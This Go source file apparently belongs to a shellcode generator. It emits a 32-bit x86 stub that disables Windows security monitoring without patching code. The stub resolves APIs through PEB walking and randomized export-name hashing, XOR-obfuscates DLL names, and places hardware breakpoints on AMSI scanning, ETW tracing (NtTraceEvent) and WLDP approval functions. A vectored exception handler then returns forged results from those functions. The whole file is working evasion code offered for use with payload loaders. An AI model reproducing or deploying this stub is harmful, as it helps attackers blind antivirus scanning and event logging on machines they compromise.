package donut

import (
	"bytes"
	"encoding/binary"
	"fmt"
)

/*
	32-bit mirror of the patchless evade stage.

	Entry contract: [ESP] is the outer return address and [ESP+4] is the
	instance pointer.  The balanced EBP frame, PUSHFD/PUSHAD save area, and
	final JMP preserve both words exactly.  Win32 APIs are called using
	stdcall stack arguments.  The VEH is installed before SetThreadContext so
	there is no interval in which an armed breakpoint lacks a handler.
*/

const (
	ev32LoadLib   = 0x28
	ev32GetTC     = 0x2c
	ev32SetTC     = 0x30
	ev32AddVEH    = 0x34
	ev32AmsiBase  = 0x38
	ev32WldpBase  = 0x3c
	ev32Targets   = 0x40
	ev32NtdllBase = 0x50
	ev32Strings   = 0x70
	ev32Ctx       = 0x340
	ev32Frame     = 0x31c // from the PUSHAD floor (EBP-0x24) to EBP-0x340

	ctx32Flags = 0x00
	ctx32Dr0   = 0x04
	ctx32Dr1   = 0x08
	ctx32Dr2   = 0x0c
	ctx32Dr3   = 0x10
	ctx32Dr6   = 0x14
	ctx32Dr7   = 0x18
	ctx32Eax   = 0xb0
	ctx32Eip   = 0xb8
	ctx32Esp   = 0xc4

	contextI386DebugRegs = 0x00010010
)

type evadeTarget32 struct {
	name      string
	fromNtdll bool
	fromWldp  bool
	handling  evadeHandling
	retBytes  uint16
}

// GenerateEvadeStub32 emits the x86 HWBP+VEH stage.  Its final near jump is
// left with a zero displacement and must be patched with PatchEvadeJmp32.
func GenerateEvadeStub32(opts EvadeOptions) (stub []byte, meta EvadeMetadata, err error) {
	if opts.unknownTargets != 0 {
		return nil, meta, fmt.Errorf("evade: unknown target bits %#x", uint8(opts.unknownTargets))
	}
	if !opts.Amsi && !opts.Etw && !opts.Wldp {
		return nil, meta, fmt.Errorf("evade: no interception targets selected")
	}

	famInt, err := evadeRandInt(3)
	if err != nil {
		return nil, meta, err
	}
	family := evadeHashFamily(famInt)
	seed, err := evadeRandUint32()
	if err != nil {
		return nil, meta, err
	}
	if seed == 0 {
		seed = 0x9e3779b9
	}

	var targets []evadeTarget32
	if opts.Amsi {
		targets = append(targets,
			evadeTarget32{name: "AmsiScanBuffer", handling: hcAmsiScan, retBytes: 0x18},
			evadeTarget32{name: "AmsiScanString", handling: hcAmsiScan, retBytes: 0x14},
		)
	}
	if opts.Etw {
		targets = append(targets, evadeTarget32{name: "NtTraceEvent", fromNtdll: true, handling: hcEtwVoid, retBytes: 0x10})
	}
	if opts.Wldp {
		// SDK prototype has four x86 stack arguments.  ret 0x10 is required;
		// ret 0x0c would leak one argument into the caller's stack.
		targets = append(targets, evadeTarget32{name: "WldpIsClassInApprovedList", fromWldp: true, handling: hcWldp, retBytes: 0x10})
	}

	perm, err := evadeShuffle(len(targets))
	if err != nil {
		return nil, meta, err
	}
	slotHandling := make([]evadeHandling, 4)
	slotReturns := make([]uint16, 4)
	for i := range slotHandling {
		slotHandling[i] = 0xff
	}
	for dr := range perm {
		t := targets[perm[dr]]
		slotHandling[dr] = t.handling
		slotReturns[dr] = t.retBytes
	}
	meta = EvadeMetadata{
		Arch:         0,
		Family:       family,
		Seed:         seed,
		SlotHandling: slotHandling,
		SlotCount:    len(targets),
	}

	var b bytes.Buffer
	var failFixups []int

	// Balanced frame.  PUSHAD saves the entry GPR values; PUSHFD preserves
	// flags.  EBP remains the stable base while stdcall arguments are pushed.
	b.Write([]byte{0x55})       // push ebp
	b.Write([]byte{0x89, 0xe5}) // mov ebp, esp
	b.WriteByte(0x9c)           // pushfd
	b.WriteByte(0x60)           // pushad
	b.Write([]byte{0x81, 0xec}) // sub esp, ev32Frame
	binary.Write(&b, binary.LittleEndian, uint32(ev32Frame))

	if err := emitModuleBase32(&b, family, seed, "ntdll.dll", &failFixups); err != nil {
		return nil, meta, err
	}
	emitMovEBPDispFromEBX32(&b, ev32NtdllBase)
	if err := emitExportResolve32(&b, family, seed, "RtlAddVectoredExceptionHandler", &failFixups); err != nil {
		return nil, meta, err
	}
	emitMovEBPDispFromEBX32(&b, ev32AddVEH)

	if err := emitModuleBase32(&b, family, seed, "kernel32.dll", &failFixups); err != nil {
		return nil, meta, err
	}
	emitMovEBPDispFromEBX32(&b, ev32WldpBase) // temporary kernel32 base
	for _, api := range []struct {
		name string
		off  int
	}{
		{"LoadLibraryA", ev32LoadLib},
		{"GetThreadContext", ev32GetTC},
		{"SetThreadContext", ev32SetTC},
	} {
		emitMovEBXFromEBPDisp32(&b, ev32WldpBase)
		if err := emitExportResolve32(&b, family, seed, api.name, &failFixups); err != nil {
			return nil, meta, err
		}
		emitMovEBPDispFromEBX32(&b, api.off)
	}

	var fx int
	if opts.Amsi {
		if err := emitLoadLibraryCall32(&b, "amsi.dll"); err != nil {
			return nil, meta, err
		}
		b.Write([]byte{0x85, 0xc0, 0x0f, 0x84})
		fx = b.Len()
		binary.Write(&b, binary.LittleEndian, uint32(0))
		failFixups = append(failFixups, fx)
		emitMovEBPDispFromEAX32(&b, ev32AmsiBase)
	}
	if opts.Wldp {
		if err := emitLoadLibraryCall32(&b, "wldp.dll"); err != nil {
			return nil, meta, err
		}
		b.Write([]byte{0x85, 0xc0, 0x0f, 0x84})
		fx = b.Len()
		binary.Write(&b, binary.LittleEndian, uint32(0))
		failFixups = append(failFixups, fx)
		emitMovEBPDispFromEAX32(&b, ev32WldpBase)
	}

	for i, t := range targets {
		baseOff := ev32AmsiBase
		if t.fromNtdll {
			baseOff = ev32NtdllBase
		} else if t.fromWldp {
			baseOff = ev32WldpBase
		}
		emitMovEBXFromEBPDisp32(&b, baseOff)
		if err := emitExportResolve32(&b, family, seed, t.name, &failFixups); err != nil {
			return nil, meta, err
		}
		emitMovEBPDispFromEBX32(&b, ev32Targets+4*i)
	}

	// CONTEXT is 0x2cc bytes and naturally 4-byte aligned at EBP-0x340.
	emitLeaEDIFromEBP32(&b, ev32Ctx)
	b.Write([]byte{0xc7, 0x07}) // mov dword [edi], CONTEXT_i386_DEBUG_REGISTERS
	binary.Write(&b, binary.LittleEndian, uint32(contextI386DebugRegs))
	b.WriteByte(0x57)           // push edi (context)
	b.Write([]byte{0x6a, 0xfe}) // push -2 (current thread)
	emitCallEBPDisp32(&b, ev32GetTC)
	b.Write([]byte{0x85, 0xc0, 0x0f, 0x84}) // test eax,eax; jz fail
	fx = b.Len()
	binary.Write(&b, binary.LittleEndian, uint32(0))
	failFixups = append(failFixups, fx)

	dr7 := uint32(0)
	drOffs := []byte{ctx32Dr0, ctx32Dr1, ctx32Dr2, ctx32Dr3}
	for dr := range perm {
		emitMovEAXFromEBPDisp32(&b, ev32Targets+4*perm[dr])
		b.Write([]byte{0x89, 0x47, drOffs[dr]}) // mov [edi+DrX], eax
		dr7 |= 1 << uint(2*dr)
	}
	b.Write([]byte{0xc7, 0x47, ctx32Dr7})
	binary.Write(&b, binary.LittleEndian, dr7)

	// Compute the PIC handler address with call/pop.  Register VEH first.
	handlerGetPC := b.Len()
	b.Write([]byte{0xe8, 0, 0, 0, 0}) // call next
	b.WriteByte(0x58)                 // pop eax
	b.Write([]byte{0x05, 0, 0, 0, 0}) // add eax, handler-(after call)
	handlerAddField := handlerGetPC + 7
	b.WriteByte(0x50)           // push handler
	b.Write([]byte{0x6a, 0x01}) // push 1 (first handler)
	emitCallEBPDisp32(&b, ev32AddVEH)
	b.Write([]byte{0x85, 0xc0, 0x0f, 0x84})
	fx = b.Len()
	binary.Write(&b, binary.LittleEndian, uint32(0))
	failFixups = append(failFixups, fx)

	// Arm only after successful VEH registration.
	b.WriteByte(0x57)
	b.Write([]byte{0x6a, 0xfe})
	emitCallEBPDisp32(&b, ev32SetTC)
	b.Write([]byte{0x85, 0xc0, 0x0f, 0x84})
	fx = b.Len()
	binary.Write(&b, binary.LittleEndian, uint32(0))
	failFixups = append(failFixups, fx)

	emitEvadeEpilogue32(&b)
	jmpOpcode := b.Len()
	b.Write([]byte{0xe9, 0, 0, 0, 0})
	meta.JmpOffset = jmpOpcode + 1

	failPos := b.Len()
	emitEvadeEpilogue32(&b)
	b.Write([]byte{0xe9, 0, 0, 0, 0})
	meta.FailJmpOffset = b.Len() - 4
	for _, field := range failFixups {
		binary.LittleEndian.PutUint32(b.Bytes()[field:field+4], uint32(failPos-(field+4)))
	}

	handlerPos := b.Len()
	binary.LittleEndian.PutUint32(b.Bytes()[handlerAddField:handlerAddField+4], uint32(handlerPos-(handlerGetPC+5)))
	if err := emitHandler32(&b, slotHandling, slotReturns); err != nil {
		return nil, meta, err
	}
	meta.HandlerOffset = handlerPos
	meta.Size = b.Len()
	return append([]byte(nil), b.Bytes()...), meta, nil
}

func emitEvadeEpilogue32(b *bytes.Buffer) {
	b.Write([]byte{0x8d, 0x65, 0xdc}) // lea esp, [ebp-0x24] (PUSHAD floor)
	b.WriteByte(0x61)                 // popad
	b.WriteByte(0x9d)                 // popfd
	b.Write([]byte{0x89, 0xec})       // mov esp, ebp
	b.WriteByte(0x5d)                 // pop ebp
}

// emitModuleBase32 uses the native x86 PEB/LDR layout: PEB.Ldr +0x0c,
// InMemoryOrderModuleList +0x14, and link-relative DllBase/UNICODE_STRING
// fields +0x10/+0x24/+0x28 respectively.
func emitModuleBase32(b *bytes.Buffer, family evadeHashFamily, seed uint32, module string, failFixups *[]int) error {
	want := evadeHashWide(toLowerASCII(module), family, seed)
	b.Write([]byte{0x64, 0xa1, 0x30, 0, 0, 0}) // mov eax, fs:[0x30]
	b.Write([]byte{0x8b, 0x40, 0x0c})          // mov eax, [eax+0x0c] PEB->Ldr
	b.Write([]byte{0x8d, 0x50, 0x14})          // lea edx, [eax+0x14] list head
	b.Write([]byte{0x8b, 0x02})                // mov eax, [edx] first InMemoryOrder link
	b.WriteByte(0x52)                          // push edx (true circular-list sentinel)

	walkTop := b.Len()
	b.Write([]byte{0x8b, 0x70, 0x28})       // mov esi, [eax+0x28] BaseDllName.Buffer
	b.Write([]byte{0x0f, 0xb7, 0x48, 0x24}) // movzx ecx, word [eax+0x24] Length
	b.WriteByte(0xbf)                       // mov edi, seed
	binary.Write(b, binary.LittleEndian, seed)
	hashTop := b.Len()
	b.Write([]byte{0x85, 0xc9, 0x0f, 0x84})
	hashDoneField := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	b.Write([]byte{0x0f, 0xb6, 0x16}) // movzx edx, byte [esi]
	b.Write([]byte{0x80, 0xfa, 0x41, 0x7c, 0x08})
	b.Write([]byte{0x80, 0xfa, 0x5a, 0x7f, 0x03})
	b.Write([]byte{0x80, 0xc2, 0x20})
	if err := emitHashStep32(b, family); err != nil {
		return err
	}
	b.Write([]byte{0x46, 0x49}) // inc esi; dec ecx
	b.WriteByte(0xe9)
	hashBack := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	hashDone := b.Len()
	binary.LittleEndian.PutUint32(b.Bytes()[hashDoneField:hashDoneField+4], uint32(hashDone-(hashDoneField+4)))
	binary.LittleEndian.PutUint32(b.Bytes()[hashBack:hashBack+4], uint32(hashTop-(hashBack+4)))
	b.Write([]byte{0x81, 0xff})
	binary.Write(b, binary.LittleEndian, want)
	b.Write([]byte{0x0f, 0x84})
	foundField := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	b.Write([]byte{0x8b, 0x00})       // mov eax, [eax]
	b.Write([]byte{0x3b, 0x04, 0x24}) // cmp eax, [esp]
	b.Write([]byte{0x0f, 0x84})
	failField := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	*failFixups = append(*failFixups, failField)
	b.WriteByte(0xe9)
	walkBack := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	found := b.Len()
	binary.LittleEndian.PutUint32(b.Bytes()[foundField:foundField+4], uint32(found-(foundField+4)))
	binary.LittleEndian.PutUint32(b.Bytes()[walkBack:walkBack+4], uint32(walkTop-(walkBack+4)))
	b.Write([]byte{0x83, 0xc4, 0x04}) // discard sentinel
	b.Write([]byte{0x8b, 0x58, 0x10}) // mov ebx, [eax+0x10] DllBase
	return nil
}

func emitHashStep32(b *bytes.Buffer, family evadeHashFamily) error {
	switch family {
	case hashDJB:
		b.Write([]byte{0x6b, 0xff, 0x1f}) // imul edi,edi,31
		b.Write([]byte{0x01, 0xd7})       // add edi,edx
	case hashFNV:
		b.Write([]byte{0x31, 0xd7})
		b.Write([]byte{0x69, 0xff, 0x93, 0x01, 0x00, 0x01})
	case hashROL:
		b.Write([]byte{0xc1, 0xc7, 0x0d})
		b.Write([]byte{0x01, 0xd7})
	default:
		return fmt.Errorf("evade: unknown x86 hash family %d", family)
	}
	return nil
}

// emitExportResolve32 parses a PE32 export directory from EBX and leaves the
// resolved address in EBX.  Table pointers are saved on the private frame
// while EAX/EDX/EDI hash each candidate name.
func emitExportResolve32(b *bytes.Buffer, family evadeHashFamily, seed uint32, name string, failFixups *[]int) error {
	want := evadeHashASCII(name, family, seed)
	b.Write([]byte{0x8b, 0x43, 0x3c}) // mov eax,[ebx+0x3c]
	b.Write([]byte{0x01, 0xd8})       // add eax,ebx
	b.Write([]byte{0x8b, 0x40, 0x78}) // mov eax,[eax+0x78] PE32 export RVA
	b.Write([]byte{0x85, 0xc0, 0x0f, 0x84})
	noExport := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	*failFixups = append(*failFixups, noExport)
	b.Write([]byte{0x01, 0xd8})
	b.Write([]byte{0x8b, 0x48, 0x18})             // NumberOfNames
	b.Write([]byte{0x8b, 0x70, 0x20, 0x01, 0xde}) // names + base
	b.Write([]byte{0x8b, 0x78, 0x1c, 0x01, 0xdf}) // funcs + base
	b.Write([]byte{0x8b, 0x50, 0x24, 0x01, 0xda}) // ords + base
	b.WriteByte(0x53)                             // push base
	b.WriteByte(0x57)                             // push funcs
	b.WriteByte(0x52)                             // push ords

	nameTop := b.Len()
	b.Write([]byte{0x85, 0xc9, 0x0f, 0x84})
	failField := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	*failFixups = append(*failFixups, failField)
	b.WriteByte(0x49)                       // dec ecx
	b.Write([]byte{0x8b, 0x04, 0x8e})       // mov eax,[esi+ecx*4]
	b.Write([]byte{0x03, 0x44, 0x24, 0x08}) // add eax,[esp+8] base
	b.WriteByte(0xbf)
	binary.Write(b, binary.LittleEndian, seed)
	asciiTop := b.Len()
	b.Write([]byte{0x0f, 0xb6, 0x10})
	b.Write([]byte{0x84, 0xd2, 0x0f, 0x84})
	asciiDoneField := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	if err := emitHashStep32(b, family); err != nil {
		return err
	}
	b.WriteByte(0x40) // inc eax
	b.WriteByte(0xe9)
	asciiBack := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	asciiDone := b.Len()
	binary.LittleEndian.PutUint32(b.Bytes()[asciiDoneField:asciiDoneField+4], uint32(asciiDone-(asciiDoneField+4)))
	binary.LittleEndian.PutUint32(b.Bytes()[asciiBack:asciiBack+4], uint32(asciiTop-(asciiBack+4)))
	b.Write([]byte{0x81, 0xff})
	binary.Write(b, binary.LittleEndian, want)
	b.Write([]byte{0x0f, 0x85})
	nextField := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	b.Write([]byte{0x8b, 0x14, 0x24})       // mov edx,[esp] ords
	b.Write([]byte{0x0f, 0xb7, 0x04, 0x4a}) // movzx eax,word [edx+ecx*2]
	b.Write([]byte{0x8b, 0x7c, 0x24, 0x04}) // mov edi,[esp+4] funcs
	b.Write([]byte{0x8b, 0x04, 0x87})       // mov eax,[edi+eax*4]
	b.Write([]byte{0x03, 0x44, 0x24, 0x08}) // add eax,[esp+8]
	b.Write([]byte{0x83, 0xc4, 0x0c})
	b.Write([]byte{0x89, 0xc3}) // mov ebx,eax
	b.WriteByte(0xe9)
	outField := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	next := b.Len()
	binary.LittleEndian.PutUint32(b.Bytes()[nextField:nextField+4], uint32(next-(nextField+4)))
	b.WriteByte(0xe9)
	backField := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	out := b.Len()
	binary.LittleEndian.PutUint32(b.Bytes()[backField:backField+4], uint32(nameTop-(backField+4)))
	binary.LittleEndian.PutUint32(b.Bytes()[outField:outField+4], uint32(out-(outField+4)))
	return nil
}

// emitLoadLibraryCall32 materializes only rolling-XOR encoded bytes in the
// artifact, decodes them in the frame scratch area, and invokes LoadLibraryA.
func emitLoadLibraryCall32(b *bytes.Buffer, module string) error {
	if len(module) > 23 {
		return fmt.Errorf("evade: x86 module name too long: %s", module)
	}
	plain := make([]byte, 24)
	copy(plain, module)
	key, err := evadeRandInt(251)
	if err != nil {
		return err
	}
	key += 2
	delta, err := evadeRandInt(15)
	if err != nil {
		return err
	}
	delta++
	enc := make([]byte, len(plain))
	for i := range plain {
		enc[i] = plain[i] ^ byte((key+i*delta)&0xff)
	}
	for i := 0; i < len(enc); i += 4 {
		// mov dword [ebp-(ev32Strings-i)], imm32
		b.Write([]byte{0xc7, 0x45, byte(-ev32Strings + i)})
		binary.Write(b, binary.LittleEndian, binary.LittleEndian.Uint32(enc[i:i+4]))
	}
	b.Write([]byte{0x8d, 0x75, byte(256 - ev32Strings)}) // lea esi,[ebp-0x70]
	b.Write([]byte{0x31, 0xff})                          // xor edi,edi
	b.WriteByte(0xbb)
	binary.Write(b, binary.LittleEndian, uint32(key))
	loop := b.Len()
	b.Write([]byte{0x83, 0xff, 0x18, 0x0f, 0x83})
	doneField := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	b.Write([]byte{0x0f, 0xb6, 0x06})       // movzx eax, byte [esi]
	b.Write([]byte{0x30, 0xd8, 0x88, 0x06}) // xor al, bl; mov [esi], al
	b.Write([]byte{0x80, 0xc3, byte(delta), 0x46, 0x47})
	b.WriteByte(0xe9)
	back := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	done := b.Len()
	binary.LittleEndian.PutUint32(b.Bytes()[doneField:doneField+4], uint32(done-(doneField+4)))
	binary.LittleEndian.PutUint32(b.Bytes()[back:back+4], uint32(loop-(back+4)))
	// ESI is post-incremented by the decoder. Recompute the scratch base so
	// LoadLibraryA receives the beginning of the decoded module name.
	b.Write([]byte{0x8d, 0x75, byte(256 - ev32Strings)}) // lea esi,[ebp-0x70]
	b.WriteByte(0x56)                                    // push esi
	emitCallEBPDisp32(b, ev32LoadLib)
	return nil
}

func emitHandler32(b *bytes.Buffer, slotHandling []evadeHandling, slotReturns []uint16) error {
	b.Write([]byte{0x8b, 0x4c, 0x24, 0x04}) // mov ecx,[esp+4] EXCEPTION_POINTERS
	b.Write([]byte{0x8b, 0x01})             // mov eax,[ecx] ExceptionRecord
	b.Write([]byte{0x81, 0x38, 0x04, 0, 0, 0x80})
	b.Write([]byte{0x0f, 0x85})
	jnePass := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	b.Write([]byte{0x8b, 0x51, 0x04}) // mov edx,[ecx+4] ContextRecord
	b.Write([]byte{0x8b, 0x82})       // mov eax,[edx+Eip]
	binary.Write(b, binary.LittleEndian, uint32(ctx32Eip))

	type arm struct {
		dr       int
		handling evadeHandling
		retBytes uint16
	}
	var arms []arm
	for i, h := range slotHandling {
		if h != 0xff {
			arms = append(arms, arm{i, h, slotReturns[i]})
		}
	}
	rot, err := evadeRandInt(len(arms))
	if err != nil {
		return err
	}
	arms = append(append([]arm{}, arms[rot:]...), arms[:rot]...)
	jeFields := make([]int, len(arms))
	for i, a := range arms {
		b.Write([]byte{0x39, 0x82})
		binary.Write(b, binary.LittleEndian, uint32(ctx32Dr0+4*a.dr))
		b.Write([]byte{0x0f, 0x84})
		jeFields[i] = b.Len()
		binary.Write(b, binary.LittleEndian, uint32(0))
	}
	b.WriteByte(0xe9)
	jmpPass := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))

	tailPos := make([]int, len(arms))
	gadgetFields := make([]int, len(arms))
	gadgetBases := make([]int, len(arms))
	for i, a := range arms {
		tailPos[i] = b.Len()
		retVal := uint32(0)
		if a.handling == hcAmsiScan {
			retVal = 0x80070057
		}
		b.Write([]byte{0xc7, 0x82}) // mov [edx+Eax],retVal
		binary.Write(b, binary.LittleEndian, uint32(ctx32Eax))
		binary.Write(b, binary.LittleEndian, retVal)
		if a.handling == hcWldp {
			// SDK: (classID, hostInformation, isApproved, optionalFlags).
			// The third stdcall argument is at saved ESP+12 (after return).
			b.Write([]byte{0x8b, 0x8a})
			binary.Write(b, binary.LittleEndian, uint32(ctx32Esp))
			b.Write([]byte{0x8b, 0x49, 0x0c})                   // mov ecx,[ecx+12]
			b.Write([]byte{0xc7, 0x01, 0x01, 0x00, 0x00, 0x00}) // mov dword [ecx],1
		}
		b.Write([]byte{0x83, 0xa2})
		binary.Write(b, binary.LittleEndian, uint32(ctx32Dr6))
		b.WriteByte(byte(^(1 << uint(a.dr))))
		// call/pop obtains a PIC base; add is patched to the slot's ret imm16.
		gadgetBases[i] = b.Len() + 5
		b.Write([]byte{0xe8, 0, 0, 0, 0, 0x59, 0x81, 0xc1})
		gadgetFields[i] = b.Len()
		binary.Write(b, binary.LittleEndian, uint32(0))
		b.Write([]byte{0x89, 0x8a})
		binary.Write(b, binary.LittleEndian, uint32(ctx32Eip))
		b.Write([]byte{0xb8, 0xff, 0xff, 0xff, 0xff})
		b.Write([]byte{0xc2, 0x04, 0x00}) // VEH callback itself is stdcall
	}
	pass := b.Len()
	b.Write([]byte{0x31, 0xc0, 0xc2, 0x04, 0x00})

	gadgetPos := make([]int, len(arms))
	for i, a := range arms {
		gadgetPos[i] = b.Len()
		b.WriteByte(0xc2)
		binary.Write(b, binary.LittleEndian, a.retBytes)
	}
	for i := range arms {
		binary.LittleEndian.PutUint32(b.Bytes()[jeFields[i]:jeFields[i]+4], uint32(tailPos[i]-(jeFields[i]+4)))
		binary.LittleEndian.PutUint32(b.Bytes()[gadgetFields[i]:gadgetFields[i]+4], uint32(gadgetPos[i]-gadgetBases[i]))
	}
	binary.LittleEndian.PutUint32(b.Bytes()[jnePass:jnePass+4], uint32(pass-(jnePass+4)))
	binary.LittleEndian.PutUint32(b.Bytes()[jmpPass:jmpPass+4], uint32(pass-(jmpPass+4)))
	return nil
}

// PatchEvadeJmp32 patches both balanced exit jumps to the same following
// stage.  Each displacement is computed from its own instruction end.
func PatchEvadeJmp32(stub []byte, meta EvadeMetadata, nextStageOffset int) error {
	patch := func(off int) error {
		if off <= 0 || off+4 > len(stub) {
			return fmt.Errorf("evade: bad x86 jmp offset %d", off)
		}
		disp := int32(nextStageOffset - (off + 4))
		binary.LittleEndian.PutUint32(stub[off:off+4], uint32(disp))
		return nil
	}
	if err := patch(meta.JmpOffset); err != nil {
		return err
	}
	if meta.FailJmpOffset > 0 {
		return patch(meta.FailJmpOffset)
	}
	return nil
}

func emitMovEBPDispFromEBX32(b *bytes.Buffer, off int) {
	b.Write([]byte{0x89, 0x5d, byte(-off)})
}
func emitMovEBPDispFromEAX32(b *bytes.Buffer, off int) {
	b.Write([]byte{0x89, 0x45, byte(-off)})
}
func emitMovEBXFromEBPDisp32(b *bytes.Buffer, off int) {
	b.Write([]byte{0x8b, 0x5d, byte(-off)})
}
func emitMovEAXFromEBPDisp32(b *bytes.Buffer, off int) {
	b.Write([]byte{0x8b, 0x45, byte(-off)})
}
func emitCallEBPDisp32(b *bytes.Buffer, off int) {
	b.Write([]byte{0xff, 0x55, byte(-off)})
}
func emitLeaEDIFromEBP32(b *bytes.Buffer, off int) {
	b.Write([]byte{0x8d, 0xbd})
	binary.Write(b, binary.LittleEndian, uint32(-int32(off)))
}
